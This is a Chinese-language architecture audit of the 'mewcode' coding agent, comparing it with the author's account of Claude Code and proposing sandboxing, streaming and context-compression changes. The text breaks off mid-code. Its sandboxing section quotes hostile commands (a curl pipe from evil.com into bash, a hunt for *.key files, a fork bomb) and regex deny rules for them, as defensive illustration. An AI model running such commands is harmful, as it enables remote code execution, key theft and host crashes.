# mewcode 架构审计与改进方向

> **审计基准**: Claude Code 设计标准  
> **审计日期**: 2025-06-25  
> **审计范围**: mewcode-python v0.9.0，约 15,000 行 Python，15 个子系统  
> **文档用途**: 秋招面试准备——展示架构分析能力与工程判断力

---

## 目录

1. [执行摘要](#1-执行摘要)
2. [架构对比总览](#2-架构对比总览)
3. [P0 — 架构基础层（5 项）](#3-p0--架构基础层)
4. [P1 — 质量与鲁棒性（7 项）](#4-p1--质量与鲁棒性)
5. [P2 — 用户体验层（5 项）](#5-p2--用户体验层)
6. [P3 — 面向未来演进（5 项）](#6-p3--面向未来演进)
7. [实施优先级路线图](#7-实施优先级路线图)
8. [附录：关键文件索引](#8-附录关键文件索引)

---

## 1. 执行摘要

### 1.1 总体评估

mewcode 是一个架构设计**相当成熟**的代码智能体项目。在 15,000 行 Python 代码中，已经实现了 Agent 循环、多提供商 LLM 抽象、两层上下文压缩、六层权限检查链、子代理系统、多 Agent 团队协作、MCP 协议集成、Hook 事件系统、技能系统、Git Worktree 隔离等完整功能。作为一个单人项目，这个完成度令人印象深刻。

与 Claude Code 设计标准对比，mewcode 在以下方面**已达到或接近** Claude Code 水平：

| 维度 | mewcode 现状 | 评价 |
|------|-------------|------|
| Agent 循环 | AsyncIterator 事件驱动，6 阶段 step() | ✅ 设计优秀 |
| 工具系统 | Tool ABC + Pydantic 参数验证 + 延迟加载 | ✅ 设计优秀 |
| 权限系统 | 6 层分层决策（Plan→SafeReadOnly→DangerousBlacklist→PathSandbox→RuleEngine→HITL） | ✅ 业内领先 |
| 上下文管理 | L1 工具结果预算 + L2 LLM 摘要压缩 | ✅ 双保险策略 |
| Prompt 缓存 | Anthropic cache_control + ContentReplacementState 稳定前缀 | ✅ 考虑周全 |
| MCP 集成 | stdio/HTTP 双传输，自动重连，工具包装 | ✅ 标准实现 |
| Sub-agent | 三种隔离模式（同进程/Worktree/终端窗格） | ✅ 灵活全面 |
| Hook 系统 | 15 个生命周期事件 + 条件引擎 + 4 种动作执行器 | ✅ 功能完整 |

### 1.2 核心差距概述

但以下方面存在显著差距，按严重程度排列：

| # | 差距 | 严重程度 | Claude Code 做法 |
|---|------|----------|-----------------|
| 1 | 工具输出不支持流式传输 | 🔴 关键 | 实时流式输出，用户可见进度 |
| 2 | Bash 命令无进程级隔离 | 🔴 关键 | 进程沙箱 + 资源限制 |
| 3 | 上下文压缩策略粗糙 | 🟡 重要 | 基于相关性的智能修剪 |
| 4 | AgentTool 单体类 666 行 | 🟡 重要 | 关注点分离，独立执行器 |
| 5 | 无模型路由智能 | 🟡 重要 | 按任务复杂度自动选择模型 |
| 6 | 记忆系统无向量检索 | 🟡 重要 | 嵌入向量 + 语义检索 |
| 7 | 混合中英文代码库 | 🟢 改善 | 全英文标准 |
| 8 | 无 REST API 模式 | 🟢 改善 | 分离 Agent 循环与 UI 层 |
| 9 | 无可观测性管道 | 🟢 改善 | 结构化日志 + 指标导出 |
| 10 | 无插件系统 | 🟢 改善 | Python entry_points 扩展 |

---

## 2. 架构对比总览

### 2.1 子系统逐项对比

```
┌──────────────────────┬────────────────────────┬────────────────────────┬──────────┐
│      子系统           │      mewcode           │     Claude Code        │   差距   │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ Agent 循环           │ AsyncIterator + 6阶段   │ Event-Sourcing +       │   小     │
│                      │ step() 状态机           │ 不可变事件日志          │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ LLM 客户端           │ ABC + 3种协议适配       │ 多模型路由 + 自动选择   │   中     │
│                      │ (Anthropic/OpenAI/Chat) │                        │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 工具系统             │ Tool ABC + Pydantic     │ 结构化输入/输出         │   小     │
│                      │ + 22个工具              │ + 流式执行              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 工具执行             │ 批量收集后返回           │ 实时流式输出            │   大 🔴  │
│                      │ (ToolResult)            │ (StreamEvent)          │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 权限系统             │ 6层分层决策             │ 按工具/类别分级         │   小     │
│                      │ + YAML规则引擎          │ + 学习上次决策          │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 安全沙箱             │ 路径白名单 only          │ 进程隔离 + 资源限制     │   大 🔴  │
│                      │ (PathSandbox 61行)      │ + 多层防御              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 上下文管理           │ L1工具预算+L2摘要压缩    │ 相关性评分+智能修剪     │   中     │
│                      │ (token数阈值触发)        │ +多层策略               │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ Prompt 缓存          │ Anthropic cache_control  │ 多提供商缓存策略        │   中     │
│                      │ (仅Anthropic)           │                        │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 子Agent生成          │ AgentTool 单体(666行)   │ 独立执行器              │   中     │
│                      │ 4条路径混在一起          │ 关注点分离              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ Agent间通信          │ 文件邮箱(无ack/重试)    │ 结构化A2A协议           │   大 🔴  │
│                      │ crash时消息丢失         │ + 消息生命周期          │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 记忆系统             │ Markdown文件+LLM选择    │ 向量嵌入+语义检索       │   中     │
│                      │ (每轮LLM调用开销)       │ (O(相关记忆))           │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 会话恢复             │ COMPACT_BOUNDARY标记    │ 检查点+原子写入         │   中     │
│                      │ 损坏时回放全部历史       │ + 哈希校验              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ MCP集成              │ stdio+HTTP双传输        │ MCP-first工具集成       │   小     │
│                      │ + 自动重连              │ + 动态发现              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ Hook系统             │ 15事件+4执行器          │ 主要扩展机制            │   小     │
│                      │ + 条件引擎              │                        │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 技能系统             │ 内联/分叉双模式         │ Skills作为Prompt扩展    │   小     │
│                      │ + 目录技能自定义工具     │                        │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ Worktree隔离         │ Git worktree + 符号链接  │ Worktree默认隔离        │   小     │
│                      │ + 自动清理              │                        │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 可观测性             │ TraceManager(最简)      │ 结构化日志+指标导出     │   大 🔴  │
│                      │ + print风格logging       │ + 分布式追踪            │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ 扩展性               │ 基于文件(.md)           │ Plugin entry_points     │   中     │
│                      │ 无Python插件API         │ + 文件加载              │          │
├──────────────────────┼────────────────────────┼────────────────────────┼──────────┤
│ API模式              │ TUI only                │ Agent循环与UI分离       │   中     │
│                      │                         │ + REST/SSE              │          │
└──────────────────────┴────────────────────────┴────────────────────────┴──────────┘
```

### 2.2 架构模式对比

```
mewcode (当前):
  TUI ──→ Agent ──→ LLM
           │
           ├──→ Tool (同步execute, 返回ToolResult)
           ├──→ PermissionChecker (6层)
           └──→ ContextManager (L1+L2)

Claude Code (目标):
  UI/API ──→ Agent ──→ LLM
              │
              ├──→ Tool (流式execute, 实时StreamEvent)
              ├──→ Sandbox (进程隔离+资源限制)
              ├──→ PermissionChecker (结构化+学习)
              └──→ ContextManager (相关性评分+多策略)
```

---

## 3. P0 — 架构基础层

> 这些是**阻塞级**问题——不解决会直接影响安全性、用户体验或代码可维护性。
> 建议按 P0-1 → P0-2 → P0-5 → P0-3 → P0-4 的顺序实施。

---

### P0-1: 引入流式工具输出协议

**涉及文件**:
- `mewcode/tools/base.py` — Tool ABC，增加可选 `stream()` 方法
- `mewcode/tools/bash.py` — Bash 工具改为逐行流式输出
- `mewcode/agent.py` — Agent 循环中的工具执行路径（约 808-938 行）

**现状问题**:

当前 `Tool` 抽象基类只定义了 `async execute(params) -> ToolResult`，所有工具执行完毕后一次性返回结果。对于耗时操作（`npm install`、`pytest`、大文件读取），用户在工具执行期间看不到任何输出——体验如同"黑盒等待"。

代码证据：`agent.py` 中 `_execute_single_tool_direct()` 直接 `await tool.execute()`，然后一次性产生 `ToolResultEvent`。

**Claude Code 标准**:

Claude Code 所有工具输出都是**实时流式**的——Bash 命令逐行显示、文件读取逐段展示。这不仅是 UX 问题，更是**安全需求**：用户需要实时看到 Agent 在做什么，以便及时干预（Ctrl+C 取消危险操作）。

**改进方案**:

```python
# base.py: 在 Tool ABC 中增加可选的流式接口
class Tool(ABC):
    async def stream(self, params: BaseModel) -> AsyncIterator[StreamEvent]:
        """流式执行，默认降级为封装 execute()"""
        result = await self.execute(params)
        yield TextDelta(text=result.output)
        yield StreamEnd()

# bash.py: 覆盖 stream()，逐行读取 stdout
class BashTool(Tool):
    async def stream(self, params: BashParams) -> AsyncIterator[StreamEvent]:
        proc = await asyncio.create_subprocess_shell(
            params.command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        async for line in proc.stdout:
            yield TextDelta(text=line.decode())
        await proc.wait()
        yield StreamEnd(exit_code=proc.returncode)
```

Agent 循环中，将 `_execute_tool()` 从"收集结果再发送"改为"流式转发"：

```python
# agent.py: 修改工具执行路径
async for event in tool.stream(params):
    if isinstance(event, TextDelta):
        yield ToolOutputChunk(tool_name=tool.name, text=event.text)
    elif isinstance(event, StreamEnd):
        yield ToolResultEvent(tool_name=tool.name, exit_code=event.exit_code)
```

**改进效果**:
- ✅ 长时间命令实时可见（npm install、pytest 等不再"黑盒"）
- ✅ 用户可以及早 Ctrl+C 取消问题命令
- ✅ 匹配 Claude Code 的流式 UX 体验
- ✅ 为 P2-3（TUI 流式渲染）提供基础

---

### P0-2: Bash 命令进程级沙箱加固

**涉及文件**:
- `mewcode/tools/bash.py` — 当前直接 `create_subprocess_shell()`（第 33 行）
- `mewcode/permissions/dangerous.py` — 仅 8 个正则黑名单模式（第 10-18 行）
- `mewcode/permissions/sandbox.py` — 仅路径白名单，无进程级隔离（61 行）

**现状问题**:

当前的安全防护是**两层薄纸**：

1. **正则黑名单**（`dangerous.py`）：用正则匹配 `rm -rf /`、`mkfs`、`dd` 等明显危险命令。但 `pip install malicious-package`、`curl evil.com/script.sh | bash`、`find / -name "*.key"` 等操作完全不受限。

2. **路径沙箱**（`sandbox.py`）：仅对 `category in ("read", "write")` 的工具生效，**Bash 工具不走路径沙箱检查**（见 `checker.py` 第 65 行）。

3. **无资源限制**：没有内存上限、CPU 时间限制、文件描述符限制。Agent 执行 `:(){ :|:& };:` （fork 炸弹）会直接搞挂主机。

**Claude Code 标准**:

Claude Code 采用**纵深防御**（Defense in Depth）：
- Git Worktree 隔离文件系统
- 结构化权限检查（按命令类别）
- 容器级/进程级资源限制
- 网络访问控制

**改进方案**:

引入 `SandboxExecutor` 抽象层，提供两种后端：

```python
# 新增 mewcode/sandbox/executor.py
class SandboxExecutor(ABC):
    """命令执行的沙箱抽象"""
    async def execute(self, command: str, cwd: str, 
                      limits: ResourceLimits) -> SandboxResult:
        ...

class SubprocessSandbox(SandboxExecutor):
    """Linux: 使用 unshare 做轻量级进程隔离"""
    async def execute(self, command, cwd, limits):
        wrapped = f"unshare -m -n -- timeout {limits.max_seconds} {command}"
        # 同时设置 rlimit: RLIMIT_AS, RLIMIT_NPROC, RLIMIT_FSIZE
        ...

class DockerSandbox(SandboxExecutor):
    """可选: Docker 容器级隔离 (用于高风险操作)"""
    ...
```

扩展 `DangerousCommandDetector`：

```python
# dangerous.py: 增加检测模式
_DANGEROUS_PATTERNS.extend([
    r'\bcurl\b.*\|.*\b(?:ba)?sh\b',      # curl | bash
    r'\bpip\s+install\b(?!\s+--dry-run)', # pip install (非dry-run)
    r'\bnpm\s+install\s+-g\b',            # npm全局安装
    r'\bnc\s+-[lL]',                      # netcat监听
    r'>\s*/dev/[hs]d[a-z]',              # 写入块设备
])
```

在 `Bash.execute()` 中集成沙箱：

```python
# bash.py
async def execute(self, params: BashParams) -> ToolResult:
    sandbox = self._get_sandbox()  # 按配置选择后端
    result = await sandbox.execute(
        command=params.command,
        cwd=self.work_dir,
        limits=ResourceLimits(max_memory_mb=512, max_seconds=300)
    )
    return ToolResult(output=result.stdout, is_error=result.exit_code != 0)
```

**改进效果**:
- ✅ 命令无法访问项目目录外的文件（`unshare -m` 隔离挂载命名空间）
- ✅ 网络隔离防止数据外泄（`unshare -n`）
- ✅ 内存/CPU/时间硬限制防止资源耗尽
- ✅ 从"两层薄纸"升级为"纵深防御"

---

### P0-3: 基于相关性的智能上下文压缩

**涉及文件**:
- `mewcode/context/manager.py` — `auto_compact()` 函数（第 730-853 行）
- `mewcode/conversation.py` — `Message` 数据类，增加 `relevance_score` 字段

**现状问题**:

当前压缩策略是**二元的**：`should_auto_compact()` 仅基于 token 数判断（第 400 行），达到阈值就把"前面的全部摘要掉，保留最近 N 条"。这导致：

1. **所有消息平等对待**：40K token 的错误调试对话和 40K token 的闲聊对话，压缩策略完全相同
2. **可能丢弃关键上下文**：Agent 花了很多轮次阅读和理解的核心文件内容，可能因为"不够新"而被摘要掉
3. **LLM 反复读文件**：压缩后丢失了之前的文件阅读结果，Agent 被迫重新 `ReadFile`

**Claude Code 标准**:

Claude Code 对每条消息进行**相关性评分**——文件内容高相关性，系统提醒低相关性——然后按分数决定保留/截断/摘要。

**改进方案**:

在 `Message` 数据类中增加元数据：

```python
# conversation.py
@dataclass
class Message:
    role: str
    content: str
    # ... 现有字段 ...
    
    # 新增字段
    relevance_score: float = 1.0      # 0.0-1.0，1.0=最高相关性
    content_type: str = "text"        # text | tool_use | tool_result | system
    token_count: int = 0              # 缓存token估算
```

在消息插入时自动计算相关性分数：

```python
def _compute_relevance(message: Message) -> float:
    """根据消息特征计算相关性分数"""
    if message.content_type == "tool_result":
        # 错误输出 → 高相关性；正常输出 → 按长度衰减
        if message.is_error:
            return 0.95
        return max(0.3, 1.0 - len(message.content) / 50000)
    elif message.content_type == "tool_use":
        # 文件写入 → 高；搜索 → 低
        if message.tool_category == "write":
            return 0.9
        elif message.tool_category in ("search", "read"):
            return 0.5
        return 0.7
    elif message.content_type == "system":
        return 0.1  # 系统提醒最低优先级
    return 0.5  # 普通文本
```

改进压缩策略——用优先队列替代简单切分：

```python
# context/manager.py
async def auto_compact(self, conversation, target_tokens):
    # 1. 为所有消息计算分数，按分数排序
    scored_messages = sorted(
        conversation.history[:-KEEP_RECENT],  # 最近几轮强制保留
        key=lambda m: m.relevance_score,
    )
    
    # 2. 从最低分开始删除，直到满足token预算
    to_summarize, to_drop = [], []
    current_tokens = estimate_total_tokens(conversation.history)
    for msg in scored_messages:
        if current_tokens <= target_tokens:
            break
        if msg.relevance_score > HIGH_THRESHOLD:  # >0.8 → 保留原文
            continue
        elif msg.relevance_score > LOW_THRESHOLD: # 0.3-0.8 → 摘要
            to_summarize.append(msg)
        else:                                      # <0.3 → 直接丢弃
            to_drop.append(msg)
        current_tokens -= msg.token_count
    
    # 3. 只对"中等相关性"的消息做LLM摘要
    if to_summarize:
        summary = await self._summarize(to_summarize)
        ...
```

**改进效果**:
- ✅ 关键上下文（错误信息、文件编辑）不会被意外丢弃
- ✅ 减少不必要的 LLM 摘要调用（低相关性消息直接丢弃）
- ✅ Agent 更少出现"我忘了之前读取的文件内容"
- ✅ 压缩后上下文质量更高 = Agent 决策更准确

---

### P0-4: 模型路由智能

**涉及文件**:
- `mewcode/client.py` — `LLMClient` ABC 和多客户端实现
- `mewcode/config.py` — `ProviderConfig` 目前只支持单模型
- `mewcode/validator.py` — `MODEL_CONTEXT_WINDOWS` 硬编码映射表（第 28-38 行）

**现状问题**:

1. **单模型配置**：`ProviderConfig` 一个 provider 只能配一个 `model`，所有任务（从简单文件搜索到复杂重构）都用同一个模型——对于简单操作是过度杀伤（浪费钱），对于复杂操作可能不够强。

2. **硬编码窗口映射**：`validator.py` 中的 `MODEL_CONTEXT_WINDOWS` 表（如 `"gpt-4.1": 1_000_000`、`"claude": 200_000`）会随着模型更新而过期。

**Claude Code 标准**:

Claude Code 自动根据任务复杂度路由：简单文件操作 → Haiku，复杂重构 → Sonnet，架构设计 → Opus。同时通过 API 动态获取 context window，而非硬编码。

**改进方案**:

```python
# 新增 mewcode/routing/router.py
class ModelRouter:
    """根据对话状态自动选择模型"""
    
    def __init__(self, providers: list[ProviderConfig]):
        self.tiers = self._classify_tiers(providers)
        # tier_1: cheap/fast (e.g., haiku, gpt-4o-mini)
        # tier_2: balanced (e.g., sonnet, gpt-4o)
        # tier_3: powerful (e.g., opus, gpt-4.1)
    
    def select(self, conversation_state: ConversationState) -> ProviderConfig:
        score = self._compute_complexity(conversation_state)
        # 简单任务 → tier_1, 中等 → tier_2, 困难 → tier_3
        if score < 0.3:
            return self.tiers[1]
        elif score < 0.7:
            return self.tiers[2]
        else:
            return self.tiers[3]
    
    def _compute_complexity(self, state) -> float:
        """基于多维度计算任务复杂度"""
        factors = []
        # 对话长度
        factors.append(min(state.turn_count / 30, 1.0) * 0.2)
        # 错误率
        factors.append(min(state.error_count / 3, 1.0) * 0.3)
        # 待处理工具调用数
        factors.append(min(len(state.pending_tool_calls) / 5, 1.0) * 0.2)
        # 文件编辑数
        factors.append(min(state.file_edit_count / 10, 1.0) * 0.3)
        return sum(factors)
```

配置层面支持多 Tier：

```yaml
# config.yaml
providers:
  - name: cheap
    protocol: anthropic
    model: claude-haiku-4-5-20251001
    tier: 1
  - name: balanced
    protocol: anthropic
    model: claude-sonnet-4-6
    tier: 2
  - name: powerful
    protocol: anthropic
    model: claude-opus-4-8
    tier: 3
```

**改进效果**:
- ✅ 简单操作（搜索、读取）自动使用便宜模型，**成本降低 60-80%**
- ✅ 复杂重构自动升级到强模型
- ✅ 错误累积时自动提升模型能力（自愈机制）
- ✅ 增加 `/model` 命令允许手动覆盖

---

### P0-5: AgentTool 单体拆分

**涉及文件**:
- `mewcode/tools/agent_tool.py` — 当前 665 行，`execute()` 方法 4 条代码路径混在一起
- `mewcode/agents/fork.py` — Fork 逻辑
- `mewcode/agents/task_manager.py` — 后台任务管理

**现状问题**:

`AgentTool.execute()` 当前在一个方法中处理四种完全不同的场景：
1. **队友生成**（Team member spawn）：创建 Git Worktree，启动 tmux/iTerm2/进程内终端
2. **Worktree 隔离子代理**：在独立 Worktree 中运行子代理
3. **后台任务**：通过 `TaskManager.launch()` 异步执行
4. **内联 Fork**：直接 Fork 当前对话继续执行

每种场景有不同的对话状态设置、权限继承、Worktree 分配、结果收集方式。全部揉在一个 665 行的类中，导致：
- 添加新隔离策略需要修改已有代码（违反开闭原则）
- 四种路径高度耦合，改一个容易破坏其他三个
- 单元测试困难——无法独立测试某一种生成模式

**Claude Code 标准**:

Claude Code 将"生成什么"（what to spawn）与"如何生成"（how to spawn it）**严格分离**。

**改进方案**:

```
agent_tool.py (重构后)
├── AgentTool (调度器, ~100行)
│   └── execute() → 按 params.isolation 分派到对应 Executor
│
├── executors/
│   ├── base.py          — SpawnExecutor ABC
│   ├── inline.py        — 内联子代理（同进程）
│   ├── worktree.py      — Worktree 隔离子代理
│   ├── teammate.py      — 远程队友生成（tmux/iTerm2）
│   └── background.py    — 后台任务
│
├── context_builder.py   — SpawnContextBuilder (共享的对话/权限/env 设置逻辑)
└── result_handler.py    — 统一的结果收集与通知逻辑
```

```python
# executors/base.py
class SpawnExecutor(ABC):
    """子代理生成器的抽象基类"""
    
    @abstractmethod
    async def execute(
        self,
        params: AgentToolParams,
        parent_context: SpawnContext,
    ) -> ToolResult:
        ...

# executors/worktree.py
class WorktreeSpawnExecutor(SpawnExecutor):
    async def execute(self, params, parent_context):
        # 仅处理 Worktree 隔离逻辑
        wt = await self.worktree_manager.create(params.isolation)
        sub_agent = self._build_sub_agent(params, parent_context, cwd=wt.path)
        result = await sub_agent.run_to_completion(params.task)
        await self.worktree_manager.cleanup(wt)
        return result

# agent_tool.py (重构后)
class AgentTool(Tool):
    def __init__(self, ...):
        self._executors: dict[str, SpawnExecutor] = {
            "inline": InlineSpawnExecutor(...),
            "worktree": WorktreeSpawnExecutor(...),
            "teammate": TeammateExecutor(...),
        }
    
    async def execute(self, params: AgentToolParams) -> ToolResult:
        executor = self._executors.get(params.isolation or "inline")
        context = self._build_spawn_context(params)
        return await executor.execute(params, context)
```

**改进效果**:
- ✅ 每种隔离模式可独立测试、独立修改
- ✅ 新增 SSH 远程代理后端只需添加一个 Executor 类
- ✅ 共享的上下文构建逻辑复用，消除重复代码
- ✅ 代码从 665 行单体降为 5 个 ~100-150 行的清晰模块

---

## 4. P1 — 质量与鲁棒性

> 这些是**重要但不阻塞**的改进——提升系统的可靠性、安全性和长期可维护性。

---

### P1-1: 向量化记忆检索

**涉及文件**:
- `mewcode/memory/auto_memory.py` — `MemoryManager`（第 47-241 行）
- `mewcode/memory/recall.py` — `find_relevant_memories()`

**现状问题**:

当前记忆系统的代价与记忆总量成正比：每轮对话都把所有记忆文件内容加载并注入到系统提示中（`recall.py` 使用 LLM 选择最多 5 条）。这带来两个问题：
1. **LLM 调用开销**：每轮都要调用 LLM 做记忆选择，增加延迟和费用
2. **上下文膨胀**：记忆文件增长后，即使是"选择"前的候选列表也可能很大

**Claude Code 标准**:

使用嵌入向量做语义检索，O(1) 成本找到相关记忆，无需 LLM 参与选择过程。

**改进方案**:

```python
# memory/embeddings.py (新增)
class MemoryEmbeddingStore:
    """基于本地嵌入的记忆向量存储"""
    
    def __init__(self, db_path: Path):
        self.model = self._load_embedder()  # all-MiniLM-L6-v2 via ONNX
        self.conn = sqlite3.connect(str(db_path / "embeddings.db"))
        self._init_tables()
    
    def index(self, memory_items: list[MemoryItem]):
        """将新记忆嵌入并存入向量索引"""
        texts = [item.content for item in memory_items]
        vectors = self.model.encode(texts)
        for item, vector in zip(memory_items, vectors):
            self._insert(item.id, vector.tobytes(), item.metadata)
    
    def search(self, query: str, top_k: int = 5) -> list[MemoryItem]:
        """语义搜索最相关的记忆"""
        query_vec = self.model.encode([query])[0]
        # SQLite 中的余弦相似度搜索
        results = self._cosine_search(query_vec, top_k)
        return [self._load_item(r.id) for r in results]
```

MemoryManager 集成：

```python
# auto_memory.py 修改
class MemoryManager:
    def __init__(self, work_dir: str):
        self.store = MemoryEmbeddingStore(Path(work_dir) / ".mewcode" / "memory")
    
    async def recall(self, query: str, top_k: int = 5) -> list[MemoryItem]:
        # 优先使用向量检索（零 LLM 调用）
        return self.store.search(query, top_k)
    
    async def extract_and_store(self, conversation):
        # 提取记忆 → 嵌入 → 存入向量索引
        memories = await self._llm_extract(conversation)
        self.store.index(memories)
        # 同时保留 markdown 文件作为可读备份
        self._write_markdown_backup(memories)
```

**改进效果**:
- ✅ 记忆检索从每轮 1 次 LLM 调用降为 0 次（纯本地计算）
- ✅ 记忆量从 O(所有记忆) 降为 O(top-K)，上下文膨胀问题解决
- ✅ 语义搜索比 LLM 选择更精确（余弦相似度 vs. LLM 主观判断）

---

### P1-2: 标准化 Agent 间通信协议（A2A）

**涉及文件**:
- `mewcode/teams/mailbox.py` — 当前文件邮箱（130 行），无 ACK/重试
- `mewcode/tools/send_message.py` — 消息发送工具

**现状问题**:

当前的队友间通信基于**文件系统邮箱**——`mailbox.py` 用 JSON 文件存储消息，`consume()` 直接删除文件。存在严重缺陷：
1. **无消息确认（ACK）**：接收方崩溃 → 消息永久丢失
2. **无请求/响应关联**：发送消息后无法追踪回复
3. **无结构化任务分配**：不能传递带类型的任务（"请你审查这个 PR" vs. "请你写这个功能" 都是纯文本）
4. **轮询模式**：每 2 秒扫描文件系统，延迟高且浪费 IO

**Claude Code 标准**:

使用结构化协议——消息有类型、关联 ID、交付保证。

**改进方案**:

```python
# teams/protocol.py (新增)
@dataclass
class AgentMessage:
    """标准化 Agent 间消息"""
    message_id: str        # UUID
    correlation_id: str | None  # 回复某条消息的 ID
    type: MessageType      # TASK | RESULT | STREAM_CHUNK | ERROR | CAPABILITY_QUERY
    sender: str            # agent_id
    recipient: str         # agent_id or "broadcast"
    payload: dict          # 结构化 JSON payload
    timestamp: float

class MessageType(Enum):
    TASK = "task"              # 分配任务
    RESULT = "result"          # 任务结果
    STREAM_CHUNK = "stream"    # 流式中间结果
    ERROR = "error"            # 任务失败
    CAPABILITY_QUERY = "capability_query"  # 能力协商
```

不同后端实现不同传输层：

```python
# teams/transports/
├── inprocess.py    — asyncio.Queue (零延迟，进程内)
├── websocket.py    — WebSocket (跨机器)
└── file.py         — 文件系统 (崩溃恢复 fallback)
```

带重试的可靠投递：

```python
class ReliableMailbox:
    async def send(self, msg: AgentMessage, max_retries: int = 3):
        for attempt in range(max_retries):
            await self.transport.send(msg)
            try:
                ack = await self._wait_ack(msg.message_id, timeout=5.0)
                return ack
            except TimeoutError:
                if attempt == max_retries - 1:
                    raise DeliveryFailed(f"Message {msg.message_id} lost")
```

**改进效果**:
- ✅ 消息不丢失（ACK + 重试机制）
- ✅ 结构化任务分配（Agent 之间可以协商能力、传递类型化数据）
- ✅ 进程内传输零延迟（vs. 当前 2 秒轮询间隔）
- ✅ 支持超越星型拓扑的 Agent 协作模式

---

### P1-3: 多提供商 Prompt 缓存

**涉及文件**:
- `mewcode/client.py` — 当前仅 Anthropic 客户端有缓存标记（`_mark_last_user_tail_for_cache` 等）

**现状问题**:

Prompt 缓存仅在 Anthropic 协议上实现（`cache_control: {"type": "ephemeral"}` 标记）。当使用 OpenAI（支持 `prompt_cache_key`）、DeepSeek（支持 `prompt_cache_key`）、或任何其他有缓存能力的提供商时，全部 token 按全价计费。在多提供商场景下，这是**90% 的成本浪费**。

**改进方案**:

抽象缓存策略：

```python
# client.py 修改
class CacheStrategy(ABC):
    """协议特定的 Prompt 缓存策略"""
    @abstractmethod
    def annotate(self, messages: list[dict], tools: list[dict]) -> list[dict]:
        """为消息列表添加缓存标记"""

class AnthropicCacheStrategy(CacheStrategy):
    def annotate(self, messages, tools):
        # 现有逻辑：system 块、最后一个 tool schema、最后 user 消息标记 cache_control
        ...

class OpenAICacheStrategy(CacheStrategy):
    def annotate(self, messages, tools):
        # 使用 prompt_cache_key header（匹配前缀的自动缓存）
        # 或依赖 >1024 token 的自动缓存
        ...

class DeepSeekCacheStrategy(CacheStrategy):
    def annotate(self, messages, tools):
        # 使用 DeepSeek 的 prompt_cache_key header
        ...
```

客户端集成：

```python
class AnthropicClient(LLMClient):
    def __init__(self, config):
        self.cache_strategy = AnthropicCacheStrategy()
    
    async def stream(self, conversation, system, tools):
        annotated = self.cache_strategy.annotate(messages, tools)
        # 发送带缓存标记的请求
        ...
```

**改进效果**:
- ✅ 非 Anthropic 提供商也能享受 90% 缓存命中折扣
- ✅ 使 P0-4 的多模型路由在经济上更可行
- ✅ 缓存策略可插拔，新增提供商只需添加对应策略类

---

### P1-4: 会话恢复加固

**涉及文件**:
- `mewcode/memory/session.py` — `Session` 类和 `COMPACT_BOUNDARY` 记录处理
- `mewcode/context/manager.py` — `reconstruct_replacement_state()`（第 149 行）

**现状问题**:

会话恢复依赖 `COMPACT_BOUNDARY` 记录中存储的摘要 + 保留尾。如果该记录**缺失或损坏**（进程崩溃时的部分写入），系统回退到**回放全部原始历史**——这可能超过 context window 导致立即再次压缩或 API 拒绝。

此外 `replacement_records.jsonl`（context/manager.py）中的工具结果替换状态必须与 session 记录**保持一致**，否则恢复后工具结果显示为占位符。

**改进方案**:

引入检查点快照：

```python
# session.py 修改
@dataclass
class SessionCheckpoint:
    """会话检查点——压缩时的完整快照"""
    compact_boundary_index: int
    summary_text: str
    keep_tail_hash: str           # 保留尾的 SHA256
    replacement_state_hash: str   # 替换状态的 SHA256
    created_at: float

class Session:
    async def create_checkpoint(self, boundary_idx, summary, tail, repl_state):
        """创建压缩检查点"""
        checkpoint = SessionCheckpoint(
            compact_boundary_index=boundary_idx,
            summary_text=summary,
            keep_tail_hash=hashlib.sha256(json.dumps(tail).encode()).hexdigest(),
            replacement_state_hash=hashlib.sha256(
                json.dumps(repl_state).encode()
            ).hexdigest(),
            created_at=time.time(),
        )
        # 原子写入：先写 .tmp 再 rename
        self._atomic_write("checkpoint.json", checkpoint.to_json())
    
    async def recover(self):
        """恢复——验证检查点完整性"""
        cp = self._load_checkpoint()
        actual_tail_hash = self._compute_tail_hash()
        actual_repl_hash = self._compute_replacement_hash()
        
        if cp.keep_tail_hash != actual_tail_hash:
            # 哈希不匹配 → 部分修复模式
            await self._partial_reconstruct(cp)
        elif cp.replacement_state_hash != actual_repl_hash:
            # 替换状态不一致 → 重建
            await self._rebuild_replacement_state(cp)
        else:
            # 所有一致 → 正常恢复
            self._restore_from_checkpoint(cp)
```

**改进效果**:
- ✅ 任何崩溃状态下的零丢失恢复
- ✅ 哈希校验保证了恢复后状态一致性
- ✅ 不再有"回放全部历史"的危险回退路径

---

### P1-5: 权限 HITL 速率限制

**涉及文件**:
- `mewcode/agent.py` — `_execute_tool()` 方法（第 857-938 行）
- `mewcode/permissions/checker.py` — 权限决策逻辑

**现状问题**:

当 Agent 在同一轮生成了多个需要确认的工具调用时（如 10 个 `WriteFile`），每个都会触发一个单独的 `PermissionRequest` → 用户被 10 个连续的权限对话框轰炸。恶意或困惑的 Agent 可能故意利用这一点；即使正常使用时也很烦人。

**Claude Code 标准**:

相似的工具调用在同一轮中合并为一个权限对话框，用户可以选择"全部应用"。

**改进方案**:

```python
# agent.py 新增
class PermissionCoalescer:
    """合并同轮中的相似权限请求"""
    
    def __init__(self, max_per_turn: int = 5):
        self.pending: list[PermissionRequest] = []
        self.max_per_turn = max_per_turn
    
    def add(self, request: PermissionRequest) -> CoalescedRequest | None:
        """如果已有相似请求，合并；否则加入队列"""
        for existing in self.pending:
